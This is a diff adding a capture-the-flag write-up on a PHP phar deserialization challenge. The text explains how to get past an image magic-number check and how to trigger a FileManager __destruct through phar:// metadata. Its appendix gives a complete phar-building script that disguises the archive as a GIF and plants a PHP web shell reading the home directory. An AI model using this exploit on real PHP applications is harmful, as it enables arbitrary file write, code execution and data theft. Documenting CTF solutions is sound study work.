@@ -1,0 +1,44 @@
+###phar unserialize vulnerability###
+
+###Part1 : Bypass Magic num check
+	An interesting part of php is that it will look for '<?php' tag before resolving script
+	Thus, adding the magic bytes in front of file can help bypass check and maintain a valid php
+
+###Part2 : Create phar
+	Since there are many file operations, and a class with defined __destruct() magic method, 
+	  it is reasonable to think that phar exploit is the key of this question
+	Moreover, the variable of getimagesize() is completely controlable further strengthens this guess
+
+	Examining the __destruct() functions show that a abitrary file upload/delete might be possible
+	However, since our goal is to leak data, upload seems more reasonable than delete
+	Thus, I created a phar archive that create a php file with the code showns in appendix below
+		ps. phar://[path]/James.txt as variable will trigger the unserialization of Metadata in any file operation
+
+
+###Part3 : Get flag
+	Uploaded php file will cat everything in home directory, leaking the flag
+
+
+
+###Apendix
+	###Phar Creator
+		<?php
+		$phar = new Phar('James.phar');
+		$phar->startBuffering();
+		$phar->addFromString('James.txt', '');
+		$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
+
+		// add object of any class as meta data
+		class FileManager {
+		    public $name = '';
+		    public $content = '';
+		    public $mode = '';
+		}
+
+		$object = new FileManager(null,null,null);
+		$object->mode = 'upload';
+		$object->name = '/var/www/html/uploads/James.php';
+		$object->content = '<?php echo `cat ~/*`; ?>';
+		$phar->setMetadata($object);
+		$phar->stopBuffering();
+		?>
